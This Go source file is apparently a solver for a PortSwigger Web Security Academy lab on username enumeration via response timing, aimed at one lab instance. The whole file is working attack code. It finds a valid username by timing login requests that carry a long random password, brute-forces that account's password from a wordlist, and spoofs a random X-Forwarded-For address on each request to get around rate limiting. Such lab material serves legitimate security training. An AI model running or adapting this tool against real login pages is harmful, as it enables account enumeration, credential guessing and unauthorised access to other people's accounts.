// https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing

package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"
)

func main() {
	err := solve()
	if err != nil {
		log.Fatalln(err)
	}
}

func solve() error {
	client, err := newClient()
	if err != nil {
		return err
	}

	u := "https://0a3100600424e52ac09f4f8700cd008c.web-security-academy.net"
	loginUrl := u + "/login"

	username, err := username(loginUrl, client)
	if err != nil {
		return err
	}

	password, err := password(loginUrl, username, client)
	if err != nil {
		return err
	}

	fmt.Println("Username:", username)
	fmt.Println("Password:", password)
	return nil
}

func username(u string, client *http.Client) (string, error) {
	f, err := os.Open("usernames.txt")
	if err != nil {
		return "", err
	}
	defer f.Close()

	sc := bufio.NewScanner(f)
	for sc.Scan() {
		username := sc.Text()
		fmt.Println(username)
		start := time.Now()
		_, err := login(u, username, randString(1024), client)
		end := time.Now()
		if err != nil {
			return "", err
		}
		if time.Duration(2*time.Second) < end.Sub(start) {
			return username, nil
		}
	}
	return "", fmt.Errorf("username not found")
}

func password(u, username string, client *http.Client) (string, error) {
	f, err := os.Open("passwords.txt")
	if err != nil {
		return "", err
	}
	defer f.Close()

	sc := bufio.NewScanner(f)
	for sc.Scan() {
		password := sc.Text()
		fmt.Println(password)
		body, err := login(u, username, password, client)
		if err != nil {
			return "", err
		}
		if strings.Contains(string(body), "Your username") {
			return password, nil
		}
	}
	return "", fmt.Errorf("password not found")
}

func login(u, username, password string, client *http.Client) ([]byte, error) {
	postData := url.Values{"username": {username}, "password": {password}}
	req, err := http.NewRequest("POST", u, strings.NewReader(postData.Encode()))
	if err != nil {
		return nil, err
	}
	req.Header.Add("X-Forwarded-For", randIP())

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode/100 != 2 && resp.StatusCode/100 != 3 {
		return nil, fmt.Errorf("%v", resp.Status)
	}
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	return body, nil
}

func newClient() (*http.Client, error) {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, err
	}

	return &http.Client{Jar: jar}, nil
}

const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

func randString(n int) string {
	rand.Seed(time.Now().UnixNano())
	b := make([]byte, n)
	for i := range b {
		b[i] = letterBytes[rand.Intn(len(letterBytes))]
	}
	return string(b)
}

func randIP() string {
	rand.Seed(time.Now().UnixNano())
	b := &strings.Builder{}
	b.WriteString(strconv.Itoa(rand.Intn(200)))
	b.WriteByte('.')
	b.WriteString(strconv.Itoa(rand.Intn(200)))
	b.WriteByte('.')
	b.WriteString(strconv.Itoa(rand.Intn(200)))
	b.WriteByte('.')
	b.WriteString(strconv.Itoa(rand.Intn(200)))
	return b.String()
}
